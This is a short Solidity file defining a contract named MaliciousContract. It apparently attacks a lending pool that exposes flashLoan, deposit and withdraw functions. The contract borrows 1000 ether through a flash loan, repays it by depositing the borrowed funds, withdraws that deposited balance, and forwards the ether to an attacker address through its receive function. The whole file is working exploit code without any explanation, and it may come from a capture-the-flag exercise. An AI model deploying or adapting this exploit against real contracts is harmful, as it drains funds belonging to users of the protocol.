// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract MaliciousContract {

    address public target;
    address public attacker;

    constructor(address _target, address _attacker) {
        target = _target;
        attacker = _attacker;
    }

    function attack() external {
        // Call the target flashLoan function
        (bool success, ) = address(target).call(abi.encodeWithSignature("flashLoan(uint256)", 1000 ether));
        if (!success) revert("FlashLoan Call is not successfull");
    }

    function execute() external payable {
        // Send the msg.value to the attacker address
        (bool success, ) = address(target).call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        if (!success) revert("Deposit Call is not successfull");
    }

    function sendValueToAttacker() external {
        (bool success, ) = address(target).call(abi.encodeWithSignature("withdraw()"));
        if (!success) revert("Deposit Call is not successfull");
    }

    receive() external payable {
        address(attacker).call{value: msg.value}("");
    }

}